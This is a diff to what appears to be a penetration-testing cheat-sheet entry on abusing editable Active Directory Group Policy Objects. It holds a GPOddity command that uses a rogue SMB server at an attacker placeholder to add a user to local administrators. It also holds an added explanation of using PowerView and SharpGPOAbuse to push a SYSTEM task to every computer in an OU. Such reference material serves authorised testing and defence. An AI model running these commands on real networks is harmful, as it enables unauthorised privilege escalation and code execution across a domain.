@@ -95,5 +95,6 @@
       "label": "Abuse via GPOddity (Linux/WSL, lab method)",
       "command": "sudo python3 gpoddity.py --gpo-id '<gpo_id>' --domain '<domain>' --username '<user>' --password '<pass>' --command 'net localgroup administrators <user> /add' --rogue-smbserver-ip '<attacker_ip>' --rogue-smbserver-share '<share>' --dc-ip '<dc_ip>' --smb-mode none"
     }
-  ]
+  ],
+  "explain": "Finds GPOs you can modify, so you can push code to every computer in the linked OU:\n  Get-DomainGPO             list all GPOs\n  | Get-DomainObjectAcl -ResolveGUIDs   read each GPO's ACL with readable right names\n  | ? {$_.ActiveDirectoryRights -match 'CreateChild|WriteProperty|GenericAll'}   keep only GPOs you can edit\nOn a writable GPO, SharpGPOAbuse --AddComputerTask adds a SYSTEM scheduled task (e.g. add yourself to local admins); gpupdate /force applies it."
 }
